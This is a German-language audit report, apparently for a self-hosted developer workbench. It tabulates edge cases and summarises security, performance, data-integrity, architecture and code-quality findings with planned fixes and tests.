Gruppiert nach Funktion. „Aktuell" = statisch belegt oder begruendet vermutet ( Confidence in Abschnitt 4).

### Orbit (Save/Sync/Assets)

| # | Funktion | Ausgangszustand | Aktion | Erwartet | Aktuell/vermutet | Risiko | Test | Behandlung |
|---|---|---|---|---|---|---|---|---|
| E-B01 | `OrbitDatabase.save` | Rev 100 auf A+B | beide speichern Rev 100 | einer 409, einer gewinnt | korrekt (Lock + Draft) | niedrig | parallel save | beibehalten |
| E-B02 | `saveLegacy` | Rev 100, Alt-Client veraltet | Save ohne Sync-v2-Header | 409/Flag | 200 mit Fremdstand (D-005) | hoch | Legacy-Save | Konfliktsignal (D-005) |
| E-B03 | Konflikt | 2 Tabs parallel, langsames Netz | Autosave nach Ruhezeit | Nutzerentscheidung | Auto-Rebase + Backup ohne UI (A-007) | hoch | Zwei-Client-Test | Konflikt-UI (A-007) |
| E-B04 | Destruktiv-Guard | Tab loescht 40 % legitim | Speichern | Schutz oder Bestaetigung | kein Guard (<50 %, A-007) | hoch | Property-Test | Diff-Guard (A-007) |
| E-B05 | Reload waehrend Save | Save laeuft | F5 | Retry/Ablesbar | unklar (nicht geprueft) | mittel | E2E Reload-mid-save | Retry-Semantik definieren |
| E-B06 | Asset-Upload parallel | gleiche Datei, 2 Uploads | gleichzeitig | 1 Asset, 1 Dedup | korrekt (Vorab + Re-Check + Reservierung) | niedrig | parallel upload | beibehalten |
| E-B07 | Asset-Delete + Crash | Asset vorhanden | Kill nach `unlink`, vor `DELETE` | kein Dauer-500 | 500 dauerhaft (D-011) | mittel | Kill-Injection | DB-first + GC (D-011) |
| E-B08 | 4-MB-Board | grosses Board | Tippen/Autosave | gedrosselt/gewarnt | Voll-Save + `localStorage` pro Dirty (P-007) | hoch | E2E grosses Board | Guard + Throttle (P-007) |
| E-B09 | Board-Name Leerzeichen | nur Spaces | Speichern | disabled | disabled + Abbrechen erhaelt Namen (E2E ok) | niedrig | — | beibehalten |
| E-B10 | Orbit 390 px | anlegen/umbenennen/Reload/loeschen | mobil | kein H-Overflow | nicht abgedeckt (U-007) | mittel | E2E 390 px | Bottom-Sheet + Collapse |
| E-B11 | Orbit Tastatur | Canvas/Edge-Menue | nur Tastatur | bedienbar | ohne Role/Trap (U-015) | mittel | Durchgang | Rollen + Trap |
| E-B12 | Migration | Crash mitten in `migrateOrbitSources` | Neustart | kein Halbstand | korrekt (`BEGIN IMMEDIATE` + Rollback + Verifikation) | niedrig | Kill-Test | beibehalten |
| E-B13 | Korrupte Version | beschaedigtes Dokument | Laden | definierter Fehler/Recovery | nicht geprueft | mittel | Property/Fuzz | Migrations-/Recovery-Test |

### Notes

| # | Funktion | Ausgangszustand | Aktion | Erwartet | Aktuell/vermutet | Risiko | Test | Behandlung |
|---|---|---|---|---|---|---|---|---|
| E-N01 | `update` parallel | Rev 5 auf A+B | A Titel, B Parent | einer 409/Merge | Last-Write-Wins (D-004) | hoch | parallel update | `expectedRevision` (D-004) |
| E-N02 | `saveContent` veraltet | Rev 5, B veraltet | B speichert | `conflict` + Backup | korrekt (0 Konflikt-Backups live) | niedrig | veralteter Save | beibehalten |
| E-N03 | `move` + `update` parallel | gleiche Note | gleichzeitig | serialisiert/409 | unklar (D-004) | mittel | parallel | mit D-004 loesen |
| E-N04 | `list/search` gross | 5k × 20 KB | `GET /notes`, `q` 1 Zeichen | paginiert <200 kB | 100 MB/Full-Scan (D-003/P-012) | hoch | Seed-Bench | Cursor + FTS |
| E-N05 | Titel 500 Zeichen | Einfuegen | Speichern | kuerzen + Hinweis | kuerrzt still auf 300 (E2E) | niedrig | E2E Toast | Zaehler „300/300" |
| E-N06 | Ungueltige `?note=`-ID | Direktlink | Oeffnen | NotFound + zurueck | vermutlich leere Auswahl | mittel | E2E | explizite Flaeche (U-011) |
| E-N07 | Loeschen + Zurueck | nach Papierkorb | Back | Papierkorb | abgedeckt (E2E) | niedrig | — | beibehalten |
| E-N08 | Offline-Reload | ohne Netz | F5 | sichtbarer Fehler, online alte Daten | abgedeckt Notes | mittel | auf Orbit/Terminal ausweiten | Health-Banner (Q-004) |

### Previews (Slots/Storage/Gateway/Logs)

| # | Funktion | Ausgangszustand | Aktion | Erwartet | Aktuell/vermutet | Risiko | Test | Behandlung |
|---|---|---|---|---|---|---|---|---|
| E-P01 | `openSession` parallel | 1 Slot frei, 2 Requests | beide POST | 1 gewinnt sauber | Tx schuetzt, aber N+1-Lockzeit (D-006) | mittel | parallel open | Read-vor-Lock (D-006) |
| E-P02 | Idempotenz | gleicher Key, anderer Fingerprint | Retry geaendert | 409 `IDEMPOTENCY_CONFLICT` | korrekt | niedrig | Key-Reuse | beibehalten |
| E-P03 | Kapazitaet | voll | `openSession` | sauber `exhausted` | Retry-Schleife + Busy moeglich (D-006) | mittel | Lasttest | Batch + Re-Validierung |
| E-P04 | Snapshot-Write parallel | Rev 3, zwei Writes | gleichzeitig | einer 409 | korrekt (Re-Check), Vorab-Read doppelt (D-007) | niedrig | parallel write | Vorab streichen (D-007) |
| E-P05 | Storage-Key rotiert | Ciphertext alt | Restore | 409, kein Klartext | korrekt (GCM + Hash) | niedrig | Rotationstest | beibehalten |
| E-P06 | Quarantaene | Reset nicht verifizierbar | Reset | Anleitung + Wechsel | nur Satz, Slot gesperrt (U-003) | hoch | E2E Quarantaene | Diagnose-CTA (U-003) |
| E-P07 | Bridge-Timeout | keine Meldung 2,5 s | Laden | Badge „ohne Diagnose" | nur Code-Kommentar | niedrig | Unit | Badge (U-006) |
| E-P08 | Ungueltige `?preview=`-ID | Direktlink | Oeffnen | Warn-Banner + Haupt | stiller Fallback (U-011) | mittel | E2E | Banner (U-011) |
| E-P09 | Logs 5k Zeilen + Filter | verbose Server | Scrollen/Reload | gefenstert, Filter bleibt | DOM unbegrenzt, Filter State-only (U-008/U-012) | mittel | Perf + Reload | Fenster + URL-Persistenz |
| E-P10 | Fremd-Zugriff | fremder Slot, Tailnet | GET Slot-URL | 403/404 | erreichbar (S-005) | hoch | Fremd-Test | Gateway-Auth (S-005) |
| E-P11 | Boeser `preview.config.json` | geklontes Repo | Start/Watchdog | Bestaetigung | stiller Exec (S-013) | mittel | Bestaetigungs-Test | Confirm-Flow (S-013) |
| E-P12 | Slot nach Restart | aktive Session | Backend-Neustart | weiter erreichbar | 404 bis Neu-`open` moeglich (A-004) | hoch | Replay-Test | Boot-Rebuild (A-004) |

### Terminal/Workspace

| # | Funktion | Ausgangszustand | Aktion | Erwartet | Aktuell/vermutet | Risiko | Test | Behandlung |
|---|---|---|---|---|---|---|---|---|
| E-T01 | Quota-Limit + Workspace-Save | am Limit | 2 Starts parallel | genau 1 gewinnt | TOCTOU (D-008) | mittel | parallel reserve | Read in Tx (D-008) |
| E-T02 | Session tot | Pane weg | Oeffnen | „Neu starten" + letzter Befehl | vorhanden | niedrig | E2E Terminal-tot | beibehalten (+ Rechtschreibung) |
| E-T03 | Grosser Paste | >Schwelle | Einfuegen | Confirm | vorhanden | niedrig | Unit | beibehalten |
| E-T04 | Reboot | nicht-persistente Sessions | Neustart Host | „abgelaufen"-State | `attach` auf toten Pane moeglich (A-014) | mittel | Socket-Verlust-Test | Existenz-Probe (A-014) |
| E-T05 | Symlink-Race | Root-Symlink wechselt | Spawn | Re-Check | TOCTOU moeglich (A-014) | mittel | Symlink-Swap | realpath-Re-Check |
| E-T06 | Terminal-WS-Flut | offen | 16-MB-Frames-Loop | 1013/Bucket | kein Nachrichten-Limit (S-009) | mittel | Flood-Test | Token-Bucket (S-009) |
| E-T07 | CWD auf Config-Dir | Terminal | `cwd` setzen | `INVALID_CWD` | aktuell moeglich (S-011) | mittel | CWD-Test | Deny-Liste (S-011) |
| E-T08 | V1-Workspace | altes Dokument | Read | Migration | korrekt (atomar, kein Rekursionsfehler) | niedrig | V1-Fixture | beibehalten |

### Accounts/Usage/Notifications/Restart/System

| # | Funktion | Ausgangszustand | Aktion | Erwartet | Aktuell/vermutet | Risiko | Test | Behandlung |
|---|---|---|---|---|---|---|---|---|
| E-S01 | `activate` parallel | gleicher Provider | 2× gleichzeitig | serialisiert | korrekt (per-Provider) | niedrig | parallel | beibehalten |
| E-S02 | `listWithState` + Journal | offenes Journal/Symlink ersetzt | `GET /accounts` | nur lesen | Saga + Restart/503 (D-009) | hoch | GET-mit-Journal | Read-seiteneffektfrei (D-009) |
| E-S03 | `restartCodexRuntime` | kein App-Server | `activate(codex)` | kein Restart | korrekt (`runtimeFound:false`) | niedrig | ohne Prozess | beibehalten |
| E-S04 | `restartCodexRuntime` | laeuft, kein systemd | `activate` | Wechsel + sichtbarer Fehler? | geschluckt | mittel | ohne systemd | propagieren (D-009) |
| E-S05 | `importUsage` Retry | gleiche Fenster | doppelt | idempotent | korrekt (`INSERT OR IGNORE`) | niedrig | Doppel-Import | beibehalten |
| E-S06 | `importCost` Re-Sync | gleicher Tag | erneut | Upsert | korrekt, aber nie Loeschung (D-001) | mittel | Re-Import | Retention (D-001) |
| E-S07 | `register` parallel | gleicher Pfad | 2 Requests | idempotent | 500 UNIQUE (D-010) | mittel | parallel | Upsert (D-010) |
| E-S08 | Notification-Doppel | gleiche `(source,kind,remoteId)` | doppelt/Retry | 1 Zeile | korrekt (`OR IGNORE` + renewable) | niedrig | Doppel-Create | beibehalten |
| E-S09 | Presence 2k ungelesen | 2k `active` | Heartbeat | schnell | Vollscan + Riesen-`IN` (D-002) | mittel | Lasttest | Batch (D-002) |
| E-S10 | `triggerRestart` doppelt | laufend | 2. POST/Reload | 409 + sicherer Retry | 409 ja, kein Key, 1-h-Block (D-015) | mittel | Doppel-POST | Key + Rotation (D-015) |
| E-S11 | Restart mid-poll | Backend down waehrend Poll | warten | Timeout-Anleitung + Retry | generisch (U-002) | mittel | E2E Kill-mid-restart | Anleitung + Retry |
| E-S12 | Report-Spam | offen | 500/min | 429 | unlimitiert (S-009) | mittel | Burst-Test | Limit (S-009) |
| E-S13 | Korruptes `meta_json` | beschaedigte Row | get/list | Fallback | korrekt (`safeJson`) | niedrig | Corrupt-Row | beibehalten |
| E-S14 | Hermes 401 | Token abgelaufen | Request | 1× Retry neu | korrekt | niedrig | 401-Test | beibehalten |
| E-S15 | OpenCode-DB gesperrt | Lock/korrupt | Sync | Grund erkennbar | `null` ohne Grund (D-014) | mittel | Lock-Test | `{ok,reason}` (D-014) |
| E-S16 | `since` ungültig/Zukunft | Log-Abruf | GET | aeltest/gefiltert | korrekt (Default 500) | niedrig | Fuzz | beibehalten |
| E-S17 | WS `session.attach` + Historie | Stream vor Antwort | Attach | kein Replay-Verlust | korrekt (Id-Zuordnung zuerst) | niedrig | Attach-Race | beibehalten |
| E-S18 | Non-Admin System-Calls | Gast-Identitaet | Restart/Account/Config | 403 | 202/200 (S-001–S-003) | hoch | 403-Tests | Admin-Gates |
| E-S19 | Spoof via Loopback | Terminal/Preview | Header faelschen | 401 | akzeptiert (S-006) | hoch | Spoof-Test | Haertung (S-006) |

### UI/Flow (Restart/Dialog/Formulare/Routing/Offline)

| # | Funktion | Ausgangszustand | Aktion | Erwartet | Aktuell/vermutet | Risiko | Test | Behandlung |
|---|---|---|---|---|---|---|---|---|
| E-U01 | Restart dirty | Orbit dirty | „Beides" | Warnung + Abbruch | direkt Poll + Reload (U-002) | hoch | Unit+E2E | Confirm + Cancel |
| E-U02 | Dialog + Zurueck | offen | Back | zu, Route bleibt | zu ohne Hinweis | niedrig | E2E | Hinweis (U-004) |
| E-U03 | Confirm Doppelklick | async Loeschung | doppelt | 1 Mutation | 2 moeglich (U-014) | mittel | Unit | Pending (U-014) |
| E-U04 | Galerie/Todo-Loeschen | Tap | loeschen | Confirm/Undo | sofort (U-013) | mittel | Unit | Schutz (U-013) |
| E-U05 | Hintergrund-500 | Sync laeuft | warten | Toast | Vollbild moeglich (Q-002) | mittel | E2E | Toast statt Dialog |
| E-U06 | „Keine Daten" | `undefined` ohne Fehler | warten | Retry | Sackgasse (Q-002) | mittel | Unit | Retry-Button |
| E-U07 | Boundary-Retry | Lazy wirft | „Erneut versuchen" | stabil/fallback | Loop moeglich (Q-001) | hoch | Unit | key-Bump (Q-001) |
| E-U08 | Skill-Konflikt | Server-Konflikt | Autosave | Warnung + Wahl | Verlust-Hinweis fehlt | mittel | Unit | Explizit-Hinweis |
| E-U09 | Skill dirty + Navigation | tippt | Route wechseln | Warnung/Flush | nur Blur-Flush | mittel | E2E | Unmount-Flush + Hinweis |
| E-U10 | Theme-Doppelklick | schnell | speichern | 1 Mutation | abgedeckt (E2E) | niedrig | — | Muster uebertragen (U-014) |
| E-U11 | Projekte 500 | Seite | oeffnen | Alert + Retry | abgedeckt (E2E) | niedrig | ausweiten | Mapping (U-003) |
| E-U12 | 120-Zeichen-Namen | lang | rendern | Ellipse + Tooltip | ohne Tooltip (U-008) | niedrig | Screenshot | `title` |
| E-U13 | `localStorage` voll/blockiert | Private Mode | Start | trotzdem starten | nur teils (`main.tsx`) | mittel | Recovery-Test | Muster ausweiten |
| E-U14 | Korrupte Stores | migrierte Preferences | Start | Fallback | Shell-Crash moeglich (Q-001) | hoch | Corrupt-Fixture | Segment-Boundaries |

## 6. Security Findings

Priorisiert nach Angriffsnaehe. Details in Abschnitt 4 (S-001–S-015).

1. **Direkter Datenzugriff/AuthZ (kritischster Block):** S-001 (Restart/Update ohne Admin), S-002
   (globaler Account-Switch), S-003 (persistente Config inkl. T3-Kanal), S-004 (keine Isolation —
   globaler Orbit/Notes/Filesystem/Projects/Skills-Zugriff), S-005 (Gateway ohne AuthN).
   Sofortmassnahme: Admin-Gates (S-001–S-003), `allowedUsers`-Warnung + Skills-Gate (S-004),
   Gateway-Token/Identitaet (S-005).
2. **Authentifizierung/Identitaet:** S-006 (Loopback-Spoof — Preview-/Terminal-Code = Admin),
   S-015 (keine Rotation/Expiry/Replay; Push-Orakel; Account-Enumeration). Massnahme: Doku +
   `socket.remoteAddress`-Fix + Proxy-Strip-Pruefung; Rotations-CLI; generische Push-Antwort;
   Maskierung.
3. **Eingabevalidierung/Uploads/Pfade:** S-010 (`sanitizeName` schwach, Dotfiles, MIME),
   S-011 (Traversal-Abwehr gut, aber Config-Root teilbar + `execFile`-Pfade), D-017.6
   (`profilePath` nur `/`-Check). Massnahme: Name-Haertung + Recheck + Dotfile-Policy +
   MIME-Allowlist; Config-Deny-Liste + Admin-Ausnahme + Binary-Allowlist.
4. **Injection/Command:** SQL/NoSQL/Command-Escape ohne Befund (Prepared, feste Args, `shellQuote`
   korrekt); Restrisiko Befehls*inhalt* aus Projekt (S-013) → Bestaetigungs-Flow + Watchdog-Gate.
5. **XSS:** S-007 (T3/Hermes Pfad-Proxy gleiche Origin — Upstream-XSS = Takeover; Uploads via
   `sandbox` mitigiert; QuickLook-Splitting-Rest). Massnahme: CSP-Merge + Pinning/Warnung,
   langfristig Origin-Trennung.
6. **CSRF/Origin:** A-010 (header-lose Mutationen passieren; unprotected Prefixe; Loopback ohne
   UID). Massnahme: Inventar + Token-Pflicht + Tests.
7. **SSRF/Redirect:** S-012 (`/proxy` gut, aber DNS-Rebinding-TOCTOU + Config-kontrollierte
   Origins; Gateway-`Location` durchgereicht). Massnahme: gepinnter Lookup + Recheck,
   Origin-Quellen, Redirect-Policy.
8. **Rate Limits/Brute-Force/Replay:** S-009 (Proxys/WS/Gateway ausgenommen; Report unlimitiert;
   shared 127.0.0.1-Budget). Massnahme: pro-Identitaet-Budgets + Report-Limit + WS-Bucket.
9. **Secrets/Env:** B-001 (Critical — Mistral-Reste entfernen sofort), B-002 (Vite-Prefix +
   Build-Assert), S-015 (Rotation-Doku).
10. **Informationslecks/Logging:** S-008 (Health `*` + Version/BootId/Instanzname), S-014
    (Report-`environment`, DevServer-Token-Logs, E-Mails; Audit-Luecken), S-004/S-015
    (Listen/Verlauf), Q-004 (Frontend-Crash-PII). Massnahme: CORS-/Payload-Minimierung,
    Allowlist + `redactText`, Audit-Erweiterung, Frontend-Redaction.
11. **Externe Integrationen/Webhooks:** Push-Validierung gut (`assertPublicHttpEndpoint` + Lookup);
    Luecken Besitz-Proof/Orakel (S-015); Diagnose-Batches via Session-Ownership (angemessen,
    Lease statt HMAC — dokumentieren).
12. **Dependency-Risiken:** Overrides + `security:audit` gut; Rest T3-Nightly (S-003/S-007/A-012)
    + Extensions (S-004) + Duplikate (B-003). Massnahme: Pinning/Warnung/Backup-Pflicht,
    dedupe, Advisory-Job (B-004).
13. **Header/Clickjacking/Cache:** Helmet + CSP + `no-store` gut (Ausnahmen S-005/S-007);
    Hermes-`immutable` + manueller Bump fragil (A-011 → Hash); Gateway `frame-ancestors`-Policy
    mit S-005-Haertung verbinden.
14. **Auditierbarkeit:** S-014 (Scope erweitern: Terminal-Creates, Switches, Kanalwechsel,
    Preview-Starts, WS-Session-Create); Actor-Spoof via S-006 beachten.

## 7. Performance Findings

Aktuelle Probleme, Skalierungsgrenzen, Messmethoden, Zielwerte. Details Abschnitt 4 (P/B).

- **First Load/Bundle (P-001, P-002, B-007):** Entry mit KaTeX-Fonts + 22 Preloads; NoteEditor
  1,2 MB; keine Chunks/Budgets; Retention verdoppelt Platte (21 MB). Messung: `du -b`,
  `.br`/`.gz`, Manifest-217, Lighthouse LCP. Ziele: Entry <200 kB gzip, Fonts <10, LCP −30 %,
  Single-Release ~10–12 MB, NoteEditor.gz ≤450 kB, index.js.gz ≤150 kB.
- **Mount/Wasserfall (P-003, P-004):** Dashboard eager + 11 Queries; `no-store` + 1,5–30-s-Polls;
  3 Tabs 60–135 Req/Min aufs geteilte 1200-Budget. Messung: `browser_network_requests`/Min/Tab,
  429-Rate. Ziele: initial ≤4 (Dashboard), ≤6 Mount-Assert; ≤15/Min/Tab idle; 0 Doppel-Calls/5 s.
- **Rendering (P-005, P-006, P-008):** Voll-Subscriptions → Voll-Re-Render; O(n²)-Drag-Pfad;
  CLS-Varianz. Messung: Profiler Commits/RenderCount, `performance.now()` (p95 <8 ms/300 Nodes),
  CLS <0,1, 60 fps/200 Nodes.
- **Sync/Serialisierung (P-007, P-011, D-001, D-003, D-006, D-007, D-016):** 4-MB-Saves +
  Doppel-`stringify` + `localStorage`/Dirty; 500 Voll-Revisionen (71 MB + 320 MB freelist);
  Kosten-Vollscan; Notes ohne Limit; N+1 unter Lock; Full-History-Reads; Audit-Scan pro Mutation.
  Messung: `Content-Length`, `dbstat`/`freelist_count`, P95-Save (<300 ms/1 MB), Dashboard-P95
  (<500 ms/10k), Audit-Overhead <5 %, Query-Counts. Ziele: Save <500 kB p95/Warnung; Revisionen
  <20 MB, freelist <10 %; `state` O(`maxHistory`); O(1)/O(slots).
- **DB/Backend (P-010, P-012–P-016, D-002, D-008):** 15 Connections/1 Datei/`FULL`/kein Retry;
  Notes-`LIKE` ohne FTS; `systeminformation`/`ss`/Walk pro Poll; Snapshot-/Collect-Groessen;
  Sync-FS im Loop; N+1 Filesystem. Messung: Busy-Rate, p95 (Ports <400 ms/20 Ports, Search
  <150 ms/5k, Antwort <200 kB; Lag p95 <30 ms; Snapshot p95 <200 kB; 0 Busy/10 Tabs).
- **Realtime/WS (P-009, P-017, S-009):** Mehrfach-Sockets, hidden Timer, kein Jitter → Herd +
  429 nach Restart. Messung: WS-Count/Heap, Restart-429. Ziele: 1 WS/Tab, 0 Timer hidden,
  gestaffelt <30 s, 0×429/10 Tabs, Erkennung ≤5 s.
- **Antwortgroessen/Batching (P-014, P-016):** Caps + Stream-Fallback + Lazy-Checks; File-Search-
  Limits als Referenz.
- **Monitoring (B-008, Abschnitt 12):** Slow-Log 200 ms, History 100 + Persistenz, Bundle-Artefakt,
  p95-Anzeige; Ziel 0 Slow >500 ms/Tag.

### Skalierungsabschaetzung (Annahmen: Single-Node, Single-File 457 MB, 1200/min shared,
Polling 20–45/Tab/Min, Orbit 600/4 MB, Terminal-Max 24, `ss`-Probe 450 ms)

| Nutzer (1–3 Tabs) | Last/Min | Verhalten | Bruchstelle |
|---|---|---|---|
| 10 (~20 Tabs) | 400–900 | Laeuft; geringes Busy-Risiko; LCP ok | Keine; VACUUM + FTS einplanen |
| 100 (~200 Tabs) | 4k–9k | 429-Spitzen (Budget gerissen), CPU-Sockel (`systeminformation`/`ss`), Busy bei parallelen Saves, Herd nach Restart | Pro-Identitaet-Limit, Poll-Reduktion (P-004), `NORMAL`, Readiness-Ausbau |
| 1.000 (~2k Tabs) | 40k–90k | Dauer-429, Event-Loop-Lag (Sync-FS + 4-MB-Saves), Index-/Poll-Ueberlast Single-File, tmux-Single-Socket | Nur mit Poll→Push, DB-Split, Port-Cache, Quota-pro-Nutzer |
| 10.000 | — | Nicht skalierbar (GBs, 2-GB-Revisions-Worst-Case, Slot-Ausschoepfung 60) | Multi-Instanz + Postgres/Turso + Objekt-Storage + Scheduler + CDN (`dist/assets` immutable bereits korrekt) |

Zielkorridor heute: ~10 Nutzer (Haertung); 100 erfordert P-004/P-010/P-012 + Limits; 1k+ Re-Architektur.

## 8. Data Integrity Findings

Alle Risiken fuer Verlust/Duplikate/Inkonsistenz/Relationen/Berechnung/Migration/Transaktion/
Parallelitaet/Import-Export/Sync. Details Abschnitt 4 (D/A).

- **Verlust still:** A-007 (Auto-Rebase), D-004 (Notes-Metadaten), D-005 (Legacy-200),
  U-002 (Restart-Reload ohne Guard), U-013 (Confirm-Luecken). Massnahmen: Konflikt-UI,
  `expectedRevision` + 409 + Backup, Legacy-Signal, Dirty-Gate, Confirm/Undo.
- **Duplikate:** D-010 (Register-Race → Upsert), D-012 (Offset-Drift → Cursor), D-001-Basename-
  Kollision (Key-Fix), E-N04-Suche (Limit/FTS). Positiv idempotent: `openSession`-Key,
  `importUsage`, Notification-`remote_unique`, Asset-Dedup — beibehalten.
- **Inkonsistente Zustaende/Relationen:** A-004 (RAM-Snapshot vs DB), A-008 (Dual-Katalog-ID-
  Kollision), A-014 (tote Sessions), D-011 (Orphan-Zeilen), D-017.1–017.3 (FK-Flag, v1-Tabellen,
  Read-Write). Massnahmen: Boot-Rebuild, Typ-Trennung, Existenz-Probe, DB-first + Orphan-GC,
  Einzeiler-Fixes.
- **Falsche Berechnungen:** D-001 (Basename-Aggregation), P-013-Cache-Busts (stale Metriken).
  Massnahmen: Key-Fix, SQL-Aggregation, TTL-Disziplin.
- **Migrationen/Rollback:** Positiv `migrateOrbitSources` (BEGIN + Rollback + Verifikation);
  offen Migrations-Ordnung/Down/VACUUM/Backup-Verifikation (B-006), v1-Cleanup (D-017.2),
  V1-Workspace-Migration im Read-Pfad (D-008 → verlagern), T3-Downgrade-Risiko (A-012/S-003 →
  Backup-Pflicht).
- **Transaktionen/Parallelitaet:** Positiv Orbit-Save, Asset-Create, Snapshot-Re-Check,
  Account-`serialized()`; offen Notes-`update` (D-004), Register (D-010), Workspace-Read (D-008),
  Sharable-Suche unter Lock (D-006 → Read-vor-Lock), `migrate()`-`BEGIN` (D-017.4 → IMMEDIATE).
- **Import/Export/Sync:** `importCost`/`importUsage`-Upserts gut, aber Kosten ohne Retention
  (D-001); Sync-`allSettled` ohne Sichtbarkeit (D-014 → `lastError`); Hermes-Offset (D-012);
  Export/Import-Roundtrip + beschaedigte Daten ungeprueft (Q-003 → Property/Fuzz-Tests).
- **Geraete-/Tab-Sync:** A-007/D-004/D-005 (Konflikte), E-U09 (Skill-dirty-Navigation),
  U-012 (Kontext-Verlust). Massnahmen: 409-Flows, Flush-Guards, URL-/Storage-Persistenz.

## 9. Architecture Improvements

### Dringend noetig (Stabilitaet/Sicherheit/Daten)

1. Admin-Gates System/Accounts/Config (S-001–S-003) — stoppt Eskalation ohne Struktur-Umbau.
2. Gateway-Auth + Cookie-Enforcement (S-005) — schliesst Fremdzugriff.
3. Boot-Rebuild Routing-Snapshot (A-004-Teil) + `synchronous`-Abwaegung/Queue (P-010) — stoppt
   Restart-404s und Busy-500er.
4. Konflikt-Signale: Legacy-Flag (D-005) + Notes-`expectedRevision` (D-004) — stoppt stille Verluste.
5. Restart-Sicherheit: beide Contracts bauen (A-009) + Smoke + dist-Retention (B-006) — stoppt
   falsche „succeeded".
6. Mistral-Entfernung (B-001) — schliesst Critical.

### Sinnvoll mittelfristig

- Contracts-Split + Barrel-Test (A-001); Boot-Phasen + degraded Health (A-002); Settings-Accessor
  (A-003); Port-Single-Source (A-005).
- Preview-Routing-Schicht + Flag-Reduktion + Datei-Teilung (A-004); Sharable-Suche in SQL (D-006).
- Orbit-Konflikt-UI + Diff-Guard + Patch-Evaluierung (A-007/P-007); Legacy-Sunset (A-007/D-005).
- Extension-Typ-Trennung + Fassade + Async-Reconcile (A-008).
- Notes-Cursor + FTS (D-003/P-012); Storage-Limits (D-007); Quota-Tx (D-008); Register-Upsert (D-010);
  Asset-Delete-Protokoll (D-011); Fehler-Taxonomie `toApiError()` (D-013); Sync-`lastError` (D-014);
  Restart-Jobs + Rotation (D-015); Audit-Job-Auslagerung (D-016).
- Proxy-CSP-Merge + Pinning (S-007); Header-Inventar + Token-Policy (A-010/S-006); SSRF-Pinning (S-012);
  Upload-/Config-Haertung (S-010/S-011); Preview-Bestaetigung (S-013); Redaction + Audit-Scope (S-014);
  Capability-Rotation (S-015).
- Bundle-Chunks + Budgets (P-001/P-002/B-007); Store-Selektoren (P-005/A-006); WS-Hub + Jitter (P-009);
  Poll-Hygiene (P-004); Metrics-Tuning (P-013); Caps/Streaming (P-014); Async-IO (P-015).
- Boundary-Topologie + Schwere-Modell (Q-001/Q-002); Frontend-Observability (Q-004/Abschnitt 12).
- Mandanten-Entscheidung (S-004/A-013): Doku + Warnung + Gates jetzt; Scoping/Instanz-Modell als
  separates Architektur-Vorhaben.

### Optional langfristig

- Poll→WS-Push statt Intervalle; DB-Split (heisse Tabellen eigene Dateien) + Postgres/Turso-Pfad
  erst bei 100→1000-Ziel; Objekt-Storage Assets; Preview-Scheduler/Container; CDN.
- T3/Hermes-Origin-Trennung (S-007); zweiter OS-User Server vs Terminals (S-011);
  Pro-Benutzer-KI-Accounts (S-002); JSON-Patch-Sync (A-007); kurzlebige Capabilities (S-015).

Jede Aenderung loest ein konkretes, oben referenziertes Problem; kein Umbau aus Vorliebe
(Performance nur mit Messung/Ziel, Architektur nur mit Risiko-Nutzen wie angegeben).

## 10. Code Quality Improvements

1. **Duplikate:** Port-Validierung ×2 → 1 (A-005); Asset-Stores ×2 → 1 Service + `bucket` oder
   Doku (A-016); Migrationssysteme ×2 → Sunset-Plan (A-016); Fehler-Mappings HTTP/WS → 1 Funktion
   (D-013); Push-/Proxy-Lookup → teilen (S-012).
2. **Typisierung:** Row-Schemas (`*_rowSchema`) statt `as unknown` (A-015); `!` entfernen
   (Regel warn→error); Hook-Deps fixen (`exhaustive-deps` error mind. stores/views/Orbit, B-007);
   Timestamp-Konvention + Helper (D-017.5); `profilePath`-Root-Check (S-Cross).
3. **Fehlerbehandlung:** `toApiError()`-Map (D-013); `retryable`/`requestId` durchreichen (D-013/Q-004);
   leere `catch` mit Warn+Zaehler (D-014); Fetch-Timeouts ueberall (D-013/D-017.6); Restart-/Update-
   Fehler als Status statt 503 beim Lesen (D-009); Delete-Fehler im Dialog halten (U-014).
4. **Modulaufteilung:** Contracts-Domaenen (A-001); Boot-Phasen (A-002); Preview-Routing (A-004);
   Extension-Commands (A-008); Orbit-Featureordner (A-006); Selektor-Module (P-005); Chunk-Module
   (P-001/P-002); Hermes/T3-Selektor-Module (A-011/A-012).
5. **Namensgebung:** `PersonalPlugin` vs `VersionedExtension` (A-008); `*_rowSchema` (A-015);
   `bootIdChanged/webBuildIdChanged` (D-015); `confirmPending` (U-014); Slow-/p95-Metriknamen (B-008).
6. **Tote Dateien/Artefakte:** Legacy-Inventar + Sunset-Datum (A-016); v1-Preview-Tabellen-Drop-Plan
   (D-017.2); Repo-Root-Clutter nach `docs/_archiv/` (A-016); `@lobehub`-Ersatz (B-003);
   ungenutzte Deps via `depcheck`/`knip` (B-003).
7. **Veraltete APIs:** Legacy-Orbit-Sync mit Sunset (A-007/D-005); `x-workbench-sync-version`-Pfad;
   `legacyPageRoutes`/Migrationen mit Datum (A-016); `APP_VERSION`-Env-Zeile (B-005).
8. **Technische Schulden (Files >350, Allowlist-Abbau):** `contracts/index.ts` 1975 → <200 (A-001);
   `OrbitWorkbench` 1232, `Dashboard` 854, `FileManagerPanel` 755, `OrbitNodeView` 639,
   `stores/orbit` 574, `legacyPageRoutes` 664 → Feature-Splits (A-006); Preview 7 Dateien 465–668
   → Verantwortung-Splits (A-004); `manager.ts` 704 → Fassade (A-008); `dependencies.ts` 388,
   `settings.ts` 391 → Phasen/Accessor (A-002/A-003). Owner + Ziel je Datei, Wachstum stoppen.
9. **Dokumentation:** Vertrauensgrenzen + unprotected-Routen (A-010); Multi-User-Status (S-004);
   Projekt-Code-Vertrauen + Preview-Warnung (S-006); Rollback-/Migrations-Ordnung (B-006);
   Retention-Fenster (Kosten/Revisionen/Logs/Notifications) (D-001/P-011/D-015/D-002);
   Restart-Idempotenz (D-015); Rotation (S-015); Theme-Ausnahmen (U-016); Offline-Prinzip (Q-Frage 3).
10. **Testbarkeit:** Settings ohne FS (A-003); Boot-Fixtures (A-002); reine Store-Actions ohne DOM
    (A-006); Row-/Fixture-Trennung Hermes/T3/OpenCode (A-013); Preview-E2E-Faehigkeit (Q-003).

## 11. Testing Strategy

### Sofort erforderlich (vor jedem Refactoring, je 0,5–2 h)

- `SystemRestartControls` Unit: Erfolg (bootId/webBuildId-Wechsel→Reload gemockt), Failed mit
  `logTail`, Timeout, Abbruch (`SystemRestartControls.tsx`; U-002/Q-003).
- `ErrorBoundary` Retry-Loop Unit: doppelt werfende Lazy-Komponente → stabil, kein Loop
  (`ErrorBoundary.tsx` + `routeHost.tsx`; Q-001).
